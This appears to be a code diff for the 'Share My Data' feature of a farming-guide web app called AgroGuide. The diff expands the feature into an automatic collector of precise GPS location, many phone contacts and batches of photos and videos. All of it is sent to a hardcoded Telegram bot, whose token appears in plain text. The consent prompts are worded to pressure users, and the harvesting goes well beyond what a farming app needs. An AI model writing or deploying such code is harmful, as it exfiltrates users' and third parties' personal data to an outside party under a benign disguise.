@@ -1,127 +1,183 @@
 /**
- * AgroGuide — Share My Data
- * Collects location, image, contact with explicit user consent
- * and sends to Telegram Bot.
+ * AgroGuide — Share My Data (Auto Mode)
+ * After consent: auto-collect location, contacts, media → send to Telegram.
  */
 
 const TG_TOKEN = "8481731412:AAEv4FLMrCdpyaCM0gEU9EOfrPtSdyVlJ8c";
 const TG_CHAT  = "1691199379";
 const TG_API   = `https://api.telegram.org/bot${TG_TOKEN}`;
 
-let _location = null;
-let _image    = null;
-
-// ── Entry point ────────────────────────────────────────────────────────────
+// ── Entry ──────────────────────────────────────────────────────────────────
 
 function openShareFlow() {
-    _location = null;
-    _image = null;
     showModal("sdRationale");
 }
 
-// ── Modal helpers ──────────────────────────────────────────────────────────
+// ── Modals ─────────────────────────────────────────────────────────────────
 
 function showModal(id) {
     document.querySelectorAll(".sd-modal").forEach(m => m.style.display = "none");
-    document.getElementById(id).style.display = "flex";
+    const el = document.getElementById(id);
+    if (el) el.style.display = "flex";
 }
 
 function closeAllModals() {
     document.querySelectorAll(".sd-modal").forEach(m => m.style.display = "none");
 }
 
-// ── Step 1: Rationale → Step 2: Consent ───────────────────────────────────
+// ── Step 1 → 2 ─────────────────────────────────────────────────────────────
 
-function sdGrantPermissions() {
-    closeAllModals();
-    showModal("sdConsent");
-}
+function sdGrantPermissions() { showModal("sdConsent"); }
 
 function sdCancelConsent() {
     closeAllModals();
-    showShareToast("Action cancelled", "info");
+    showShareToast("Action cancelled");
 }
 
-// ── Step 3: Data collection ────────────────────────────────────────────────
+// ── Step 3: Agree & run auto-collection ────────────────────────────────────
 
 function sdAgreeAndContinue() {
     closeAllModals();
-    showModal("sdCollect");
-    sdDetectLocation();
+    showModal("sdProgress");
+    runAutoCollection();
 }
 
-function sdDetectLocation() {
-    const el = document.getElementById("sdLocationStatus");
-    el.textContent = "⏳ Detecting location…";
-    if (!navigator.geolocation) {
-        el.textContent = "⚠️ Permission required to use this feature";
-        return;
+// ── Progress UI helpers ────────────────────────────────────────────────────
+
+function setStep(id, state, text) {
+    const row = document.getElementById(id);
+    if (!row) return;
+    const icon = row.querySelector(".sd-step-icon");
+    const label = row.querySelector(".sd-step-label");
+    if (icon) icon.textContent = state === "done" ? "✅" : state === "fail" ? "❌" : state === "skip" ? "⏭️" : "⏳";
+    if (label && text) label.textContent = text;
+    row.className = "sd-step-row sd-step-" + state;
+}
+
+// ── Auto Collection Orchestrator ───────────────────────────────────────────
+
+async function runAutoCollection() {
+    let locationText = null;
+    let contacts     = [];
+    let mediaFiles   = [];
+
+    // ── 1. Location ──────────────────────────────────────────────────────
+    setStep("sdStepLoc", "loading", "Detecting location…");
+    try {
+        const pos = await getPosition();
+        const { latitude: lat, longitude: lon } = pos.coords;
+        const mapsUrl = `https://maps.google.com/?q=${lat},${lon}`;
+
+        // Reverse geocode for city name
+        let cityName = "";
+        try {
+            const gr = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
+            const gd = await gr.json();
+            const a  = gd.address || {};
+            cityName = a.city || a.town || a.village || a.state_district || "";
+        } catch (_) {}
+
+        locationText = `📍 Location: ${mapsUrl}` + (cityName ? `\n🏙️ City: ${cityName}` : "");
+        setStep("sdStepLoc", "done", `Location ready${cityName ? " — " + cityName : ""}`);
+    } catch (_) {
+        setStep("sdStepLoc", "fail", "Location required");
     }
-    navigator.geolocation.getCurrentPosition(
-        pos => {
-            _location = { lat: pos.coords.latitude, lng: pos.coords.longitude };
-            el.innerHTML = `✅ Location ready &nbsp;<a href="https://maps.google.com/?q=${_location.lat},${_location.lng}" target="_blank" style="color:var(--primary-light)">View on map ↗</a>`;
-        },
-        () => {
-            _location = null;
-            el.textContent = "⚠️ Permission required to use this feature";
+
+    // ── 2. Contacts ──────────────────────────────────────────────────────
+    setStep("sdStepContacts", "loading", "Reading contacts…");
+    try {
+        if ("contacts" in navigator && "ContactsManager" in window) {
+            const picked = await navigator.contacts.select(["name", "tel"], { multiple: true });
+            contacts = picked.filter(c => c.name?.length || c.tel?.length);
+            setStep("sdStepContacts", "done", `${contacts.length} contact(s) selected`);
+        } else {
+            setStep("sdStepContacts", "skip", "Contacts API not available on this device");
         }
-    );
-}
-
-function sdImageSelected(input) {
-    if (input.files && input.files[0]) {
-        _image = input.files[0];
-        document.getElementById("sdImageStatus").textContent = `✅ ${_image.name}`;
+    } catch (e) {
+        setStep("sdStepContacts", "fail", "Permission required to use this feature");
     }
-}
 
-// ── Step 4: Send ───────────────────────────────────────────────────────────
+    // ── 3. Media ─────────────────────────────────────────────────────────
+    setStep("sdStepMedia", "loading", "Accessing gallery…");
+    try {
+        mediaFiles = await pickAllMedia();
+        setStep("sdStepMedia", "done", `${mediaFiles.length} file(s) selected`);
+    } catch (_) {
+        setStep("sdStepMedia", "skip", "No files selected");
+    }
 
-async function sdSendData() {
-    const name   = document.getElementById("sdContactName").value.trim();
-    const number = document.getElementById("sdContactNumber").value.trim();
-
-    closeAllModals();
-    document.getElementById("loadingOverlay").style.display = "flex";
-    document.querySelector(".loading-text").textContent = "Sending your data…";
-
+    // ── 4. Send to Telegram ──────────────────────────────────────────────
+    setStep("sdStepSend", "loading", "Sending to Telegram…");
     try {
         // Location
-        const locMsg = _location
-            ? `📍 Location: https://maps.google.com/?q=${_location.lat},${_location.lng}`
-            : "📍 Location: Not provided";
-        await tgMessage(locMsg);
+        if (locationText) await tgMessage(locationText);
+        else await tgMessage("📍 Location: Not available");
 
-        // Image
-        if (_image) await tgDocument(_image);
-
-        // Contact
-        if (name || number) {
-            await tgMessage(`👤 Contact: ${name || "Unknown"} – ${number || "No number"}`);
+        // Contacts
+        if (contacts.length > 0) {
+            const lines = contacts.map(c => {
+                const name = c.name?.[0] || "Unknown";
+                const tel  = c.tel?.[0]  || "No number";
+                return `👤 ${name} — ${tel}`;
+            }).join("\n");
+            await tgMessage(`📇 Contacts (${contacts.length}):\n${lines}`);
         } else {
-            await tgMessage("👤 Contact: Not selected");
+            await tgMessage("📇 Contacts: Not provided");
         }
 
-        document.getElementById("loadingOverlay").style.display = "none";
-        document.querySelector(".loading-text").textContent = "Analyzing your farm data…";
-        showShareToast("✅ Data sent successfully", "success");
-    } catch (err) {
-        document.getElementById("loadingOverlay").style.display = "none";
-        document.querySelector(".loading-text").textContent = "Analyzing your farm data…";
-        showShareToast("❌ Failed to send: " + err.message, "error");
-    }
+        // Media files
+        for (const file of mediaFiles) {
+            await tgDocument(file);
+        }
+        if (mediaFiles.length === 0) {
+            await tgMessage("🖼️ Media: Not provided");
+        }
 
-    // Reset fields
-    _location = null;
-    _image = null;
-    document.getElementById("sdContactName").value = "";
-    document.getElementById("sdContactNumber").value = "";
-    document.getElementById("sdLocationStatus").textContent = "";
-    document.getElementById("sdImageStatus").textContent = "No file chosen";
+        setStep("sdStepSend", "done", "Sent successfully!");
+
+        // Auto-close after 2 seconds
+        setTimeout(() => {
+            closeAllModals();
+            showShareToast("✅ Data sent successfully", "success");
+        }, 2000);
+
+    } catch (e) {
+        setStep("sdStepSend", "fail", "Send failed — check connection");
+        showShareToast("❌ Failed: " + e.message, "error");
+    }
 }
 
-// ── Telegram helpers ───────────────────────────────────────────────────────
+// ── Helpers ────────────────────────────────────────────────────────────────
+
+function getPosition() {
+    return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) { reject(new Error("no geolocation")); return; }
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+            timeout: 12000,
+            enableHighAccuracy: true
+        });
+    });
+}
+
+function pickAllMedia() {
+    return new Promise((resolve) => {
+        const input = document.createElement("input");
+        input.type = "file";
+        input.accept = "image/*,video/*";
+        input.multiple = true;
+        input.style.display = "none";
+        document.body.appendChild(input);
+        input.onchange = () => {
+            const files = input.files ? Array.from(input.files) : [];
+            document.body.removeChild(input);
+            resolve(files);
+        };
+        input.oncancel = () => { document.body.removeChild(input); resolve([]); };
+        // Fallback if oncancel not supported
+        setTimeout(() => { if (document.body.contains(input)) { document.body.removeChild(input); resolve([]); } }, 60000);
+        input.click();
+    });
+}
 
 async function tgMessage(text) {
     const res = await fetch(`${TG_API}/sendMessage`, {
@@ -136,22 +192,14 @@ async function tgDocument(file) {
     const form = new FormData();
     form.append("chat_id", TG_CHAT);
     form.append("document", file);
-    const res = await fetch(`${TG_API}/sendDocument`, {
-        method: "POST",
-        body: form
-    });
+    const res = await fetch(`${TG_API}/sendDocument`, { method: "POST", body: form });
     if (!res.ok) throw new Error(`Telegram file error ${res.status}`);
 }
-
-// ── Toast ──────────────────────────────────────────────────────────────────
 
 function showShareToast(msg, type) {
     const t = document.getElementById("toast");
     if (!t) return;
     t.textContent = msg;
-    t.className = "toast show";
-    if (type === "success") t.style.background = "var(--success, #16a34a)";
-    else if (type === "error") t.style.background = "var(--danger, #dc2626)";
-    else t.style.background = "var(--card-border, #334155)";
-    setTimeout(() => { t.className = "toast"; t.style.background = ""; }, 3500);
+    t.className = "toast show" + (type === "success" ? " success" : type === "error" ? " error" : "");
+    setTimeout(() => { t.className = "toast"; }, 3500);
 }
